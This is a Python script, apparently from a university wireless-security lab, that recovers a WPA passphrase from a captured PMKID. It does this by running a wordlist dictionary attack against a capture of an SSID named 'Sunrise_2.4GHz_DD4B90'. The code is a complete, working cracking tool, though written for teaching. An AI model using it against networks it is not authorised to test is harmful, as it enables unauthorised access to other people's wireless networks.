#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Find the passphrase from the PMKID info
"""

__author__ = "Robin Müller et Stéphane Teixeira Carvalho"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex

from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import *

from pbkdf2 import *
import hmac, hashlib

"""
To make this script work, scappy 2.4.3 needs to be installed with the command : pip install scapy==2.4.3
We decided to use this version because it offers a clean way to go through packets that were removed 
in the latest versions.
"""


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def getPMKIDInfo(packets, ssid):
    """
    Will get the PMKID from the first message of the 4 way handshake, as well as the client & AP mac
    :param packets: the list of packets
    :param ssid: the ssid of the target access point
    :return: the AP mac, the client mac, the pmkid
    """
    # Value identifying the first message of the 4-way handshake
    WPA_HANDSHAKE_MSG_1 = 0x008a

    # Find beacons packets coming from the ssid
    beacons = list(filter(lambda pkt: pkt.haslayer(Dot11Beacon) and pkt.info == ssid, packets))
    if len(beacons) == 0:
        raise Exception("Cannot find beacons for the corresponding ssid")

    # Get the mac of the AP and search for 1st handshake messages
    APmac = a2b_hex(beacons[0].addr2.replace(':', ''))
    handshakeMsgs1 = list(filter(lambda pkt: pkt.haslayer(WPA_key) and
                                             pkt.getlayer(WPA_key).key_info == WPA_HANDSHAKE_MSG_1 and
                                             a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
    if len(handshakeMsgs1) == 0:
        raise Exception("Cannot find handshakes for the corresponding ssid")

    # Get the mac of the client
    Clientmac = a2b_hex(handshakeMsgs1[0].addr1.replace(':', ''))

    # Get the WPA_layer of the packets found contains the value of the handshake
    handshakeMsg1 = handshakeMsgs1[0].getlayer(WPA_key)

    # The PMKID is the last 16 bytes of the content of the wpa_key in scapy
    pmkid = handshakeMsg1.wpa_key[-16:]

    return APmac, Clientmac, pmkid


def main():
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("PMKID_handshake.pcap")

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    TARGET_SSID = b'Sunrise_2.4GHz_DD4B90'  # SSID of the AP that we would like to find the passphrase
    APmac, Clientmac, pmkid = getPMKIDInfo(wpa, TARGET_SSID)
    pmk_name = b"PMK Name"  # this constant is used for the computation of the PMKID

    print("\n\nValues used to derivate keys")
    print("============================")
    print("SSID: ", TARGET_SSID, "\n")
    print("AP Mac: ", b2a_hex(APmac), "\n")
    print("Client Mac: ", b2a_hex(Clientmac), "\n")
    print("PMKID: ", pmkid.hex(), "\n")

    print("\nTrying to find passphrase")
    print("============================")
    # Read from the wordlist
    f = open('./wordlist.txt', 'r')
    # Read each line of the file. The line read will be the passphrase to test
    for passPhrase in f.read().splitlines():
        # Encode the passphrase
        passPhrase = str.encode(passPhrase)
        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase, TARGET_SSID, 4096, 32)
        # Calculate the PMKID with current pmk
        pmkid_test = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
        # The sha-1 algorithm has 20 bytes as output but PMKID is only 16 bytes long
        # So we only take the first 16 bytes
        if pmkid == pmkid_test.digest()[:16]:
            print("Working passphrase     : ", passPhrase.decode())
            break
        else:
            print("Not working passphrase : ", passPhrase.decode())


if __name__ == "__main__":
    main()
